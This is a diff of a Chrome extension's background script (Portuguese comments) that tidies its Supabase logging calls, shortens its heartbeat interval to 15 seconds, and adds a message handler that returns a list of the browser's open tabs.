@@ -63,17 +63,17 @@ let state = {
 const Logger = {
   info: (message, data = {}) => {
     console.log(`ℹ️ [INFO] ${message}`, data);
-    sendLogToSupabase("info", message, data).catch(() => {});
+    sendLogToSupabase("info", message, data).catch(() => { });
   },
 
   success: (message, data = {}) => {
     console.log(`✅ [SUCCESS] ${message}`, data);
-    sendLogToSupabase("success", message, data).catch(() => {});
+    sendLogToSupabase("success", message, data).catch(() => { });
   },
 
   warn: (message, data = {}) => {
     console.warn(`⚠️ [WARN] ${message}`, data);
-    sendLogToSupabase("warning", message, data).catch(() => {});
+    sendLogToSupabase("warning", message, data).catch(() => { });
   },
 
   error: (message, error = null, data = {}) => {
@@ -81,7 +81,7 @@ const Logger = {
     sendLogToSupabase("error", message, {
       ...data,
       error: error?.message,
-    }).catch(() => {});
+    }).catch(() => { });
   },
 
   debug: (message, data = {}) => {
@@ -104,7 +104,7 @@ function startKeepAlive() {
       .then(() => {
         Logger.debug("Keep-alive ping");
       })
-      .catch(() => {});
+      .catch(() => { });
   }, CONFIG.keepAlive.interval);
 
   Logger.debug("Keep-alive started");
@@ -162,7 +162,7 @@ async function sendHeartbeat() {
   }
 }
 
-// Iniciar heartbeat a cada 30 segundos
+// Iniciar heartbeat a cada 15 segundos (reduzido para melhor detecção)
 let heartbeatInterval = null;
 
 function startHeartbeat() {
@@ -173,12 +173,12 @@ function startHeartbeat() {
   // Enviar imediatamente
   sendHeartbeat();
 
-  // Depois a cada 30 segundos
+  // Depois a cada 15 segundos
   heartbeatInterval = setInterval(() => {
     sendHeartbeat();
-  }, 30000); // 30 segundos
+  }, 15000); // 15 segundos - mais responsivo
 
-  Logger.info("Heartbeat started");
+  Logger.info("Heartbeat started (15s interval)");
 }
 
 function stopHeartbeat() {
@@ -810,6 +810,29 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
               userEmail: state.userEmail,
               deviceId: state.deviceId,
               version: CONFIG.version,
+            },
+          };
+
+        case "LIST_TABS":
+          // Listar todas as abas abertas no navegador
+          const tabs = await chrome.tabs.query({});
+          const tabsList = tabs.map(tab => ({
+            id: tab.id,
+            title: tab.title,
+            url: tab.url,
+            active: tab.active,
+            windowId: tab.windowId,
+            favIconUrl: tab.favIconUrl,
+          }));
+
+          Logger.info("Listing open tabs", { count: tabsList.length });
+
+          return {
+            success: true,
+            data: {
+              tabs: tabsList,
+              count: tabsList.length,
+              timestamp: Date.now(),
             },
           };
 
